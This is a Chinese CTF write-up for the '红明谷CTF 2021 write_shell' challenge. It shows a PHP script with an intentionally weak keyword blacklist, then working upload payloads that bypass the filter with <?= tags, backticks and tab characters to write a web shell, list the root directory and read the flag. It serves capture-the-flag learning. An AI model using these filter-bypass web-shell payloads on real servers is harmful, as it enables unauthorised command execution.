# [红明谷CTF 2021]write_shell
![](<./img/Pasted image 20230105095843.png>)

---
```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
function check($input){
    if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)){
        // if(preg_match("/'| |_|=|php/",$input)){
        die('hacker!!!');
    }else{
        return $input;
    }
}

function waf($input){
  if(is_array($input)){
      foreach($input as $key=>$output){
          $input[$key] = waf($output);
      }
  }else{
      $input = check($input);
  }
}

$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
if(!file_exists($dir)){
    mkdir($dir);
}
switch($_GET["action"] ?? "") {
    case 'pwd':
        echo $dir;
        break;
    case 'upload':
        $data = $_GET["data"] ?? "";
        waf($data);
        file_put_contents("$dir" . "index.php", $data);
}
?>
```

`php`被过滤，使用`php`的`echo`标记简写`<?=`绕过

由于反引号`` ` ``没有被过滤，使用反引号来执行`shell`命令

空格被过滤，使用水平制表符`%09`代替

```php
/?action=pwd
```

```
sandbox/xxx/
```

```php
/?action=upload&data=<?=`ls%09/`?>
```

```php
/sandbox/xxx/
```

```
bin boot dev etc flllllll1112222222lag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var 
```

```php
/?action=upload&data=<?=`cat%09/flllllll1112222222lag`?>
```

```php
/sandbox/xxx/
```

```
flag{7fb04787-f42b-4b09-aceb-101738202f79} 
```
